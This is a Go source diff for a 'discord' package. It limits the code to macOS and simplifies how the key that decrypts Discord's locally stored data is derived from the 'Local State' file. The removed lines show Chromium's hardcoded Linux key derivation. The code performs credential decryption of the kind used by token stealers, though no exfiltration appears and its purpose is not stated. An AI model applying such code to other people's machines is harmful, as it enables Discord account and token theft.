@@ -1,4 +1,4 @@
-//go:build !windows
+//go:build darwin
 
 package discord
 
@@ -9,7 +9,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strings"
 	"sync"
 
@@ -21,45 +20,23 @@ import (
 
 func discordConfigDir() string {
 	home, _ := os.UserHomeDir()
-	if runtime.GOOS == "darwin" {
-		return filepath.Join(home, "Library", "Application Support")
-	}
-	xdg := os.Getenv("XDG_CONFIG_HOME")
-	if xdg != "" {
-		return xdg
-	}
-	return filepath.Join(home, ".config")
+	return filepath.Join(home, "Library", "Application Support")
 }
 
 func discordV10Key(appDir string) []byte {
 	data, err := os.ReadFile(filepath.Join(appDir, "Local State"))
 	if err != nil {
-		if runtime.GOOS == "linux" {
-			return pbkdf2.Key([]byte("peanuts"), []byte("saltysalt"), 1, 16, sha1.New)
-		}
-		if runtime.GOOS == "darwin" {
-			return darwinDiscordKey()
-		}
-		return nil
+		return darwinDiscordKey()
 	}
 	var state map[string]interface{}
 	if err := json.Unmarshal(data, &state); err != nil {
-		return nil
+		return darwinDiscordKey()
 	}
 	osCrypt, _ := state["os_crypt"].(map[string]interface{})
 	if osCrypt == nil {
-		return nil
-	}
-	encKeyB64, _ := osCrypt["encrypted_key"].(string)
-	_ = encKeyB64
-
-	if runtime.GOOS == "linux" {
-		return pbkdf2.Key([]byte("peanuts"), []byte("saltysalt"), 1, 16, sha1.New)
-	}
-	if runtime.GOOS == "darwin" {
 		return darwinDiscordKey()
 	}
-	return nil
+	return darwinDiscordKey()
 }
 
 func darwinDiscordKey() []byte {
